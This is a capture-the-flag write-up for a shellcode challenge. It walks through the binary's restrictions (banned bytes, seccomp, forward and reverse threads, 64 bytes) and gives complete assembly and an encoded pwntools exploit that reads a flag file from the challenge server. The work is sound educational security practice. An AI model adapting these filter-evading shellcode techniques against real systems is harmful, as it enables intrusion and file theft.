# UNO Reverse Card (Misc 300)
We've done it! We found an open service that will run code we give it! It looks like the server is multithreaded though... Files: uno. Listening on challenge.acictf.com:20109
- The flag is in a file named "flag".
- Shellcode doesn't always need to spawn a shell.

Solves: 18
# Analysis
This challenge is all about writing shellcode, shellcode that specifically fits into the parameters this binary gave us. I spent a little time taking notes on what I was and was not allowed to do in the binary, and what parameters there were. (just because they're in the list below doesn't mean I figured them out right away!)

1. Specific shellcode bytes are blacklisted: 0xc2, 0xc3, 0xca, 0xcb, 0x66, 0x6c, 0x61, and 0x67. Of those, most notable, I cannot use the letters in the word flag, and, I can't use a return.

2. `seccomp` is enabled, and only allows certain syscalls. Specifically, read, write, open, close, exit, and a few others are allowed, all else are blocked.

3. There are two threads, one runs the shellcode forwards, the other runs it in reverse.

4. In order to properly receive output, both threads _must_ return (an exit does not quite achieve this).

5. Before running the shellcode, _all_ file descriptors are closed -- including standard in, standard out, and standard error.

6. Least of all, we only have 64 bytes to fit in our shellcode.

To gloss over a sizable period of testing, I discovered the additional three helpful properties:
1. Since our code is called from a register `call rax`, we know the address of the shellcode is in rax when we begin execution.
2. Similar to the above, when our shellcode executes, we also know that the return address is in `rsp`. Which will assist us in returning properly.
3. The program output was the shellcode provided, and was read from memory after execution.

# Approach
So, my approach to this was to perform two syscalls. One would open the file `flag`. The second would read in the contents, and put it into the location of the shellcode on the stack, which would allow it to be passed back when the results were read and written to the results temp file.

Since I couldn't use the letters in the word `flag`, I changed them all by one and used an increment and a decrement to change them back when executing. (since these opcodes are only one byte long).

Finally, I used the address in `rsp` to jump back to where the execution had finished, so that the two threads would return properly. (For the reverse solution, I simply sent the `jmp [rsp]` in reverse).


# Solution
```nasm
section .text
  global _start

_start:
  push rsp
  push rax
  xor rax,rax
  xor rsi,rsi
  mov al,0x60
  inc al
  mov ah,0x68
  dec ah
  shl rax,16
  mov ah,0x6b
  inc ah
  mov al,0x65
  inc al
  push rax
  xor rax,rax
  mov rdi,rsp
  mov al, 2
  syscall
  pop rsi
  mov rdi,rax
  xor rax,rax
  xor rsi,rsi
  pop rsi
  xor rdx,rdx
  mov dl,0x30
  syscall
  pop rsp
  jmp [rsp]
```

```python
from pwn import *

context.log_level = 'debug'

shell = "\x54\x50\x48\x31\xc0\x48\x31\xf6\xb0\x60\xfe\xc0\xb4\x68\xfe\xcc\x48\xc1\xe0\x10\xb4\x6b\xfe\xc4\xb0\x65\xfe\xc0\x50\x48\x31\xc0\x48\x89\xe7\xb0\x02\x0f\x05\x5e\x48\x89\xc7\x48\x31\xc0\x48\x31\xf6\x5e\x48\x31\xd2\xb2\x30\x0f\x05\x5c\xff\x24\x24"


shell = shell + '\x90'*(0x40-len(shell)-3)+'\x24\x24\xff'

p = remote("challenge.acictf.com",20109)
#p = process('./uno')

raw_input()
p.send(shell)

p.interactive()
```
